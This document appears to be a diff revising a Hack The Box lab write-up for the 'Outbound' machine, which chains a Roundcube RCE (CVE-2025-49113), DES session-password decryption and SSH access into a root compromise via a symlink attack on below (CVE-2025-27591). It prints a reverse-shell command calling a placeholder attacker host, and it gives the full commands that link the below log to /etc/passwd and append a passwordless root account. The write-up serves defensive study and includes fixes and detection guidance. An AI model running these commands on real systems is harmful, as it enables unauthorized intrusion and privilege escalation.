@@ -1,5 +1,5 @@
 ---
-title: "Outbound: Roundcube RCE to Symlink Privilege Escalation"
+title: "Outbound — Roundcube RCE, DES Session Decryption, and below Symlink Privilege Escalation"
 description: "Authenticated Roundcube RCE (CVE-2025-49113) and session-table password decryption with the application DES key lead to SSH access; a symlink attack on the below utility's error log (CVE-2025-27591) yields root."
 type: case-study
 platform: Hack The Box
@@ -9,121 +9,146 @@ addedAt: "2026-09-14"
 tags:
   - linux
   - web
+  - roundcube
   - cve
+  - privilege-escalation
+objective: "Move from provided webmail credentials to root by exploiting an authenticated Roundcube RCE, recovering a session-stored password with the application DES key, and abusing a privileged logging utility."
+tools:
+  - rustscan
+  - penelope
+  - php
+  - mysql
+  - python3
+  - sshpass
+  - ssh
+  - below
+skill: "Authenticated web application exploitation, application-secret recovery, and Linux privilege escalation through an unsafe privileged utility"
+outcome: "Code execution as the Roundcube service account, SSH access as the local `<SYSTEM_ACCOUNT>` account via a mailbox-disclosed password, and root through the `below` symlink attack"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Target environment | Ubuntu Linux; nginx 1.24.0 fronting a Roundcube webmail instance, OpenSSH 9.6p1 |
+| Starting position | Provided low-privileged webmail credentials |
+| Objective | Reach root through a vulnerable Roundcube instance, recovered application secrets, and a privileged logging utility |
+| Outcome | Code execution as the Roundcube service account, SSH access as a local account, and root via the `below` symlink attack |
 
 ## Summary
 
-Outbound is a retired Hack The Box Linux machine. Initial access exploits CVE-2025-49113, an authenticated remote code execution vulnerability in Roundcube webmail, to obtain a shell as `www-data`. Database enumeration reveals stored session data containing encrypted user passwords, which are decrypted using the application's DES key. An email within the recovered account discloses a system password change, enabling SSH access as `<SYSTEM_ACCOUNT>`. Privilege escalation exploits CVE-2025-27591, a symlink attack on the `below` utility's error log, to gain root.
+Outbound is a Hack The Box Linux lab that chains an authenticated Roundcube remote code execution flaw (CVE-2025-49113) into full root access. The webmail configuration exposes the application database and its `des_key`, so a session-stored password can be decrypted; the recovered webmail account discloses a system password that authenticates over SSH, and the `below` logging utility is abused through a symlink attack (CVE-2025-27591) to modify `/etc/passwd` and gain root. Credential values, host and address identifiers, and callback details are replaced with role-based placeholders; command syntax is preserved.
 
-IP addresses, credentials, and internal hostnames are replaced with role-based placeholders throughout. All commands and outputs are quoted evidence from the private walkthrough.
+**Attack path:** **authenticated Roundcube RCE (CVE-2025-49113) → `www-data` shell → `config.inc.php` database credential recovery → DES session password decryption → mailbox credential disclosure → SSH as `<SYSTEM_ACCOUNT>` → `below` symlink attack (CVE-2025-27591) → root**
 
 ## Context and Objective
 
-The target runs an Nginx web server hosting a Roundcube webmail instance on a Linux host. Provided credentials grant access to the `<WEBMAIL_ACCOUNT>` webmail account. The objective is to enumerate the application, exploit known vulnerabilities, escalate privileges, and obtain root access.
+- **Target:** an Ubuntu Linux host exposing SSH (22) and nginx (80) fronting the `mail.<DOMAIN>` webmail virtual host.
+- **Application:** Roundcube webmail served from `/var/www/html/roundcube` and backed by a local MySQL database.
+- **Starting position:** provided low-privileged `<WEBMAIL_ACCOUNT>` webmail credentials.
+- **Objective:** move from the provided webmail account to root, and demonstrate the impact of an unpatched webmail flaw, application secrets reachable by the web user, and an unsafe privileged utility.
+- **Constraints:** activity was confined to the Hack The Box lab environment, and the `mail.<DOMAIN>` virtual host was resolved locally for the web requests.
 
 ## Approach and Evidence
 
-### Port Scanning
+### 1. Service Discovery
 
-A fast TCP scan reveals open ports and service versions:
+Observation: a fast TCP scan exposes SSH and an nginx web service whose HTTP title redirects to a hostname-based webmail virtual host.
 
 ```bash
-rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
+rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
 ```
-
-The recorded output shows:
 
 ```text
-PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://mail.<DOMAIN>/
 ```
 
-An Nginx web server redirects to `mail.<DOMAIN>`, indicating a virtual-hosted webmail application.
+Significance: port 80 advertises no application directly but redirects to a named virtual host, so the webmail application is reached by resolving `mail.<DOMAIN>` locally rather than the bare address.
 
-### Web Reconnaissance
+Result: SSH and an nginx service fronting a virtual-hosted webmail application are identified.
 
-The domain is added to the local hosts file for resolution:
+### 2. CVE-2025-49113 — Authenticated Roundcube RCE
+
+Observation: the application is a Roundcube webmail instance, and provided credentials are available for the `<WEBMAIL_ACCOUNT>` account. Roundcube before 1.5.10 and 1.6.x before 1.6.11 is affected by CVE-2025-49113, an authenticated PHP object deserialization flaw in `program/actions/settings/upload.php`.
+
+Action: start a listener and run the exploit with the provided credentials and a reverse-shell command.
 
 ```bash
-echo '<TARGET_IP> mail.<DOMAIN> <DOMAIN>' | sudo tee -a /etc/hosts
+penelope -p <LISTENER_PORT>
 ```
-
-The web application at `http://mail.<DOMAIN>/` is a Roundcube webmail instance. The `<WEBMAIL_ACCOUNT>` account is accessible using the provided credentials.
-
-### CVE-2025-49113 — Authenticated Roundcube RCE
-
-Roundcube is vulnerable to CVE-2025-49113, an authenticated remote code execution vulnerability. A listener is started on the attacker machine, and the exploit is executed against the Roundcube instance:
 
 ```bash
-php CVE-2025-49113.php http://mail.<DOMAIN>/ '<WEBMAIL_ACCOUNT>' '<WEBMAIL_ACCOUNT_PASSWORD>' 'bash -c "sh -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"'
+php CVE-2025-49113.php http://mail.<DOMAIN>/ '<WEBMAIL_ACCOUNT>' '<WEBMAIL_ACCOUNT_PASSWORD>' 'bash -c "sh -i >& /dev/tcp/<ATTACKER_IP>/<LISTENER_PORT> 0>&1"'
 ```
 
-The listener catches the reverse shell as `www-data`.
+The source records a reverse shell as the `www-data` service account; no terminal output for this step was retained.
 
-### Roundcube Database Configuration
+Significance: the flaw executes in the Roundcube service context, which holds the application configuration and the database credentials it references.
 
-The Roundcube configuration file contains the database connection string with MySQL credentials:
+Result: authenticated code execution is obtained as `www-data`.
+
+### 3. Database Configuration and Session Credential Recovery
+
+Observation: the Roundcube configuration stores its database connection string in plaintext, and the `www-data` user can read it.
 
 ```bash
 cat /var/www/html/roundcube/config/config.inc.php
 ```
 
-The configuration reveals the database connection string:
-
 ```php
 $config['db_dsnw'] = 'mysql://roundcube:<MYSQL_PASSWORD>@localhost/roundcube';
 ```
 
-The MySQL credentials are extracted and used to access the Roundcube database:
+The recovered credentials reach the application database, whose `session` table holds active sessions with serialized PHP blobs; `<SYSTEM_ACCOUNT>`'s session value carries an encrypted password.
 
 ```bash
 mysql -u roundcube -p<MYSQL_PASSWORD> roundcube
 ```
 
-### Session Table Investigation
-
-The `session` table contains active user sessions with serialized PHP data. The `users` table is queried first to identify accounts, then the `session` table is inspected:
-
 ```sql
 select * from session;
 ```
-
-The session table contains a serialized PHP session for `<SYSTEM_ACCOUNT>`. The value field is a base64-encoded PHP serialized session blob. The base64 payload is decoded and piped to `tr` to reveal individual fields:
 
 ```bash
 echo '<BASE64_PAYLOAD>' | base64 -d | tr ';' '\n'
 ```
 
-The decoded output reveals the serialized PHP session data, including the encrypted password field associated with `<SYSTEM_ACCOUNT>`'s session:
-
 ```text
-;username|s:<SYSTEM_ACCOUNT_LENGTH>:"<SYSTEM_ACCOUNT>"
+;username|s:<USERNAME_LENGTH>:"<SYSTEM_ACCOUNT>"
 ;password|s:32:"<ENCRYPTED_PASSWORD>"
 ```
 
-The `password` field contains a base64-encoded, DES-encrypted value for `<SYSTEM_ACCOUNT>`'s Roundcube account.
+Significance: Roundcube persists per-user session state in the database, including a base64-encoded, DES-encrypted login password, so the same secret-bearing store that the web application user already reaches also carries recoverable credentials.
 
-### Password Decryption
+Result: an encrypted session password for `<SYSTEM_ACCOUNT>` is recovered.
 
-The Roundcube configuration also contains the DES encryption key:
+### 4. DES Session Password Decryption
+
+Observation: the Roundcube configuration also contains the `des_key` used to encrypt the passwords stored in session data.
 
 ```php
 $config['des_key'] = '<DES_KEY>';
 ```
 
-A Roundcube DES decryption script is used to recover `<SYSTEM_ACCOUNT>`'s plaintext password:
+Action: run a decryption script that takes the encrypted password from the session and the `des_key` from the configuration.
 
 ```bash
 python3 rcube-decrypt.py
 ```
 
-The script prompts for the encrypted password and DES key. The decryption output yields `<SYSTEM_ACCOUNT>`'s Roundcube password.
+```text
+Decrypted password (utf-8): <ROUNDCUBE_PASSWORD>
+```
 
-### Email Disclosure and SSH Access
+Significance: the key that protects the stored password sits beside the ciphertext in the same readable configuration, so the session value is reversible rather than protected.
 
-Logging into Roundcube as `<SYSTEM_ACCOUNT>` with the decrypted password reveals an email from `<WEBMAIL_ACCOUNT>` stating that the system password has been changed:
+Result: `<SYSTEM_ACCOUNT>`'s Roundcube password is recovered and subsequently validated through the webmail application.
+
+### 5. Mailbox Disclosure and SSH Access
+
+Observation: logging into Roundcube as `<SYSTEM_ACCOUNT>` with the recovered password exposes a mailbox message that carries a new system password.
 
 ```text
 From: <WEBMAIL_ACCOUNT>
@@ -135,96 +160,85 @@ Please use the following credentials to log into your account: <SYSTEM_ACCOUNT_P
 Remember to change your password when you next log into your account.
 
 Thanks!
-
-<WEBMAIL_ACCOUNT>
 ```
 
-The new password is used to log into the machine via SSH:
+Action: use the disclosed password over SSH.
 
 ```bash
 sshpass -p '<SYSTEM_ACCOUNT_PASSWORD>' ssh <SYSTEM_ACCOUNT>@<DOMAIN>
 ```
 
-The connection succeeds:
-
 ```text
-<SYSTEM_ACCOUNT>@outbound:~$
+<SYSTEM_ACCOUNT>@<DOMAIN>:~$
 ```
 
-### CVE-2025-27591 — Below Symlink Attack
+Significance: the mailbox message converts a webmail-only secret into a system credential, so compromising the webmail layer exposes the interactive account rather than a single application.
 
-Sudo privileges are enumerated:
+Result: an authenticated SSH shell is obtained as `<SYSTEM_ACCOUNT>`.
+
+### 6. CVE-2025-27591 — below Symlink Privilege Escalation
+
+Observation: the sudo policy lets `<SYSTEM_ACCOUNT>` run `/usr/bin/below` as root, and `below` before 0.9.0 writes its logs under a directory writable by the low-privileged user, enabling a symlink attack (CVE-2025-27591).
 
 ```bash
 sudo -l
 ```
 
-The sudo configuration shows that `below` can be run as root with restrictions:
-
 ```text
-User <SYSTEM_ACCOUNT> may run the following commands on outbound:
+User <SYSTEM_ACCOUNT> may run the following commands on <DOMAIN>:
     (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d
 ```
 
-The `below` utility can run as root with sudo, with restrictions on `--config`, `--debug`, and `-d` flags. This version of `below` is vulnerable to CVE-2025-27591, a symlink attack on its error log file.
-
-First, `below` is run to generate its initial log files under `<ROOT_OWNED_LOG_DIRECTORY>`:
+Action: run `below` once to generate its root-owned logs, replace the error log with a symlink to `/etc/passwd`, run `below` again so the root-owned writer follows the symlink, then append a root-equivalent account and switch to it.
 
 ```bash
 sudo below
-```
-
-This creates log files owned by root, including a root-owned error log file.
-
-The root-owned error log is replaced with a symlink pointing to `<PRIVILEGED_TARGET_FILE>` (a sensitive system account database):
-
-```bash
-rm -f <ROOT_OWNED_ERROR_LOG>
-ln -s <PRIVILEGED_TARGET_FILE> <ROOT_OWNED_ERROR_LOG>
-```
-
-Running `below` again with sudo causes the tool to follow the symlink and modify permissions on `<PRIVILEGED_TARGET_FILE>`, making it writable by the current user:
-
-```bash
+rm -f /var/log/below/error_root.log
+ln -s /etc/passwd /var/log/below/error_root.log
 sudo below
 ```
 
-A new root-privileged user without a password is appended to the privileged account database:
-
 ```bash
-<APPEND_ROOT_PRIVILEGED_ACCOUNT_ENTRY> >> <PRIVILEGED_ACCOUNT_DATABASE>
-```
-
-Switching to the new user grants a root shell without authentication:
-
-```bash
+echo '<NEW_USER>::0:0:root:/root:/bin/bash' >> /etc/passwd
 su <NEW_USER>
 ```
 
-The shell confirms root access:
-
 ```text
-root@outbound
+root@<DOMAIN>
 ```
+
+Significance: a privileged writer that resolves its log path through user-writable storage can be redirected to an arbitrary file, so a routine permission change on the log becomes a change on `/etc/passwd`.
+
+Result: root command execution is confirmed by the root shell.
 
 ## Challenges and Decisions
 
-The attack chain required chaining multiple disclosure and vulnerability primitives: authenticated RCE via Roundcube, database access to recover session-encrypted credentials, and email interception to obtain system credentials. Each stage depended on the previous one, and the encrypted password in the session table required the application's DES key for decryption. The `below` symlink exploit required generating initial log files before replacing the error log with a symlink.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| The session password is stored encrypted and is unusable on its own | Recovered the `des_key` from `config.inc.php` and decrypted the session value | The ciphertext only becomes a usable credential when paired with the application key |
+| The sudo policy denies `below --config`, `--debug`, and `-d` | Used the default `below` invocation that the policy permits | The symlink attack needs only the root log writer, not the restricted flags |
+| The `below` log directory does not exist until the utility first runs | Ran `below` once to create its world-writable log directory and files, then removed and relinked `error_root.log` | `below` writes as root into a directory the low-privileged user can modify, so the next run follows the symlink and the root-owned writer acts on `/etc/passwd` |
 
 ## Outcome
 
-Root access was obtained on the machine. The evidence establishes a complete attack chain from initial webmail access through CVE-2025-49113, database session extraction, credential decryption, email-based credential disclosure, SSH access, and privilege escalation via CVE-2025-27591.
+The evidence establishes root command execution on the host. Access rested on an unpatched Roundcube instance, application secrets readable by the web service user, and a privileged logging utility that resolved its log path through user-writable storage. HTTP and SSH were the only exposed services.
 
 ## Lessons and Recommendations
 
-- **Update Roundcube.** CVE-2025-49113 is an authenticated RCE. Apply the vendor patch and restrict webmail access with network segmentation. (Recommendation.)
-- **Protect application configuration files.** MySQL credentials stored in plaintext `config.inc.php` were accessible to the web application user. Use restricted file permissions (e.g., 640, root-owned) and separate database credentials from the web root. (Recommendation.)
-- **Store encrypted secrets outside the database.** The Roundcube session table contained encrypted user passwords recoverable with the application's DES key. Use a key management service or store encrypted secrets outside the database accessible to the web application user. (Recommendation.)
-- **Validate log file paths in privileged contexts.** The `below` utility followed symlinks when writing to its error log file, allowing modification of `<PRIVILEGED_TARGET_FILE>`. Validate that log file paths are not symlinks before writing in privileged contexts. (Recommendation.)
-- **Isolate web application accounts from system accounts.** The initial `<WEBMAIL_ACCOUNT>` Roundcube credentials led to database access, password decryption, email interception, and ultimately SSH access as `<SYSTEM_ACCOUNT>`. Use separate authentication mechanisms for each layer. (Recommendation.)
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.
+
+1. **Unpatched Roundcube (CVE-2025-49113).** An authenticated user could reach code execution through the upload action's unvalidated `_from` parameter. *Recommendation:* upgrade to a fixed release (1.5.10 or 1.6.11) and restrict access to the webmail application. *Detection:* monitor for object-deserialization patterns and unexpected `_from` values in requests to `program/actions/settings/upload.php`.
+2. **Plaintext database credentials in application configuration.** The MySQL password was stored in `config.inc.php`, readable by the web application user. *Recommendation:* store configuration outside the web root under restrictive ownership and permissions, and scope database accounts to least privilege. *Detection:* scan configuration files and backups for embedded secrets.
+3. **Reversible passwords in session data.** The `session` table held passwords encrypted with the application `des_key`, and both the ciphertext and the key were reachable from the web user's context. *Recommendation:* avoid storing reversible credentials in session state, rotate the `des_key`, and keep key material separate from the data it protects. *Detection:* audit the `session` table for credential-bearing fields.
+4. **Symlink attack in a privileged logging utility (CVE-2025-27591).** `below` created a user-writable log location and followed a symlink when writing as root, permitting modification of `/etc/passwd`. *Recommendation:* upgrade `below` to 0.9.0 or later, keep its log directory root-owned and non-writable, and narrow the sudo policy that allows it. *Detection:* monitor symlink creation in logging directories and unexpected writes to `/etc/passwd`.
 
 ## References
 
-- Hack The Box — [Outbound](https://app.hackthebox.com/machines/Outbound) (retired machine)
-- CVE-2025-49113 — Roundcube authenticated remote code execution
-- CVE-2025-27591 — `below` symlink privilege escalation
+- [Hack The Box — Outbound](https://app.hackthebox.com/machines/Outbound) (retired machine)
+- [NVD — CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113) (Roundcube authenticated PHP object deserialization)
+- [Roundcube security updates 1.6.11 and 1.5.10](https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10) (vendor advisory for CVE-2025-49113)
+- [NVD — CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591) (`below` world-writable log directory symlink privilege escalation)
+- [Facebook security advisory — CVE-2025-27591](https://www.facebook.com/security/advisories/cve-2025-27591) (vendor advisory and fix for `below`)
+- [Below](https://github.com/facebookincubator/below) (system monitoring utility affected by CVE-2025-27591)
+- [RustScan](https://github.com/RustScan/RustScan) (fast TCP port scanner)
+- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
